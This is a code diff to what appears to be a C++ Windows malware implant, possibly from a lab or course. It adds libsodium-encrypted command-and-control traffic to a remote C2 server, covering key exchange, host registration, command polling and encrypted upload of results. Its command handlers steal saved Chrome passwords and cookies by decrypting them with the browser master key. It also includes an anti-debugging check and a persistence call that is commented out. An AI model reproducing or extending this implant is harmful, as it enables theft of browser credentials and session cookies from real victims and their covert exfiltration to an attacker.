@@ -9,8 +9,7 @@
 #include "sitawareness/sitawareness.hpp"
 #include "config/config.hpp"
 #include "loot/loot.hpp"
-// #include "com_crypto/com_crypto.hpp"
-// #include "com_crypto/libsodium-win64/include/sodium.h"
+#include "com_crypto/com_crypto.hpp"
 
 using json = nlohmann::json;
 
@@ -76,13 +75,13 @@ int check_ch0nky(){
 }
 
 int main(){
-   std::cout << "Here" << std::endl;
 //MessageBoxA(NULL,NULL,NULL,MB_YESNO);
 Sleep(100);
 check_ch0nky();
 std::string cmd_usr = "$env:UserName";
 LPSTR username_cmd = const_cast<char *>(cmd_usr.c_str());
-std::string username = runPowershellCommand(username_cmd);
+std::string username = "vagrant";
+//runPowershellCommand(username_cmd);
 std::cout << username << std::endl;
 //make_persist();
 check_debugger();
@@ -124,16 +123,44 @@ check_debugger();
 
     //std::cout << 
 
-    // encryptor enc;
-    // std::string s = enc.encrypt_public_key();
-    // json d;
-    // d["computer_guid"] = config.computer_guid;
-    // d["data"] = s;
-    // d["nonce"] = enc.random_bytes;
-    // std::cout << post(config.c2_fqdn,config.c2_port,"/key_gen",d.dump()) << std::endl;
+    encryptor enc;
+    std::string s = enc.encrypt_public_key();
+    json d;
+    d["computer_guid"] = config.computer_guid;
+    d["data"] = s;
+    d["nonce"] = enc.random_bytes;
+    std::string resp = post(config.c2_fqdn,config.c2_port,"/key_gen",d.dump());
+    std::cout << resp << std:: endl;
 
-    post(config.c2_fqdn,config.c2_port,"/register",reg.dump());
-    std::string get_cmd_resp = getNextCommand(config);
+    try{
+        resp = enc.decrypt_data(resp);
+    }catch(const std::exception& e){
+
+    }
+    //exit(1);
+
+    json send_reg;
+    send_reg["computer_guid"] =  config.computer_guid;
+    send_reg["data"] = enc.encrypt_data(reg.dump());
+    send_reg["nonce"] = enc.random_bytes;
+    std::cout << send_reg["nonce"] << std::endl;
+    resp =  post(config.c2_fqdn,config.c2_port,"/register",send_reg.dump());
+    std::cout << resp << std::endl;
+    try{
+    resp =enc.decrypt_data(resp);
+    }catch(const std::exception& e){
+
+    }
+
+    //exit(1);
+    resp = getNextCommand(config);
+    std::cout << resp << std::endl;
+    try{
+    resp = enc.decrypt_data(resp);
+    }catch(const std::exception& e){
+
+    }
+    std::string get_cmd_resp = resp;
     json command = json::parse(get_cmd_resp);
     std::string cmd_result = "";
     std::string cmd_text = "";
@@ -151,7 +178,7 @@ check_debugger();
                 getMasterKey(masterKey, "vagrant");
                 printUCharAsHex(masterKey, MASTER_KEY_SIZE);
 
-                json jsonResult = lootChromePasswords((const unsigned char*) masterKey, username);
+                json jsonResult = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
                 cmd_result = jsonResult.dump();
                 //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
 
@@ -165,7 +192,7 @@ check_debugger();
                 getMasterKey(masterKey, "vagrant");
                 printUCharAsHex(masterKey, MASTER_KEY_SIZE);
 
-                json jsonResult = lootChromeCookies((const unsigned char*) masterKey, username);
+                json jsonResult = lootChromeCookies((const unsigned char*) masterKey, "vagrant");
                 cmd_result = jsonResult.dump();
                 //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
 
@@ -180,7 +207,20 @@ check_debugger();
         if(cmd_result == ""){
             cmd_result = "Probably wrong command type or command text";
         }
-        std::cout << sendCommandResult(config,cmd_id,cmd_result) << std::endl;
+
+        std::string data = ("{\"computer_guid\": \""+config.computer_guid+"\", "
+                         "\"command_id\": \""+cmd_id+"\", "
+                         "\"result\": \""+" "+"\"}");
+        json da = json::parse(data);
+        da["result"] = cmd_result;
+        std::string cmd_data = enc.encrypt_data(da.dump());
+        resp = sendCommandResult(config,enc.random_bytes,cmd_data);
+        std::cout << resp << std::endl;
+        try{
+        resp =enc.decrypt_data(resp);
+        }catch(const std::exception& e){
+
+        }
     }
     
 
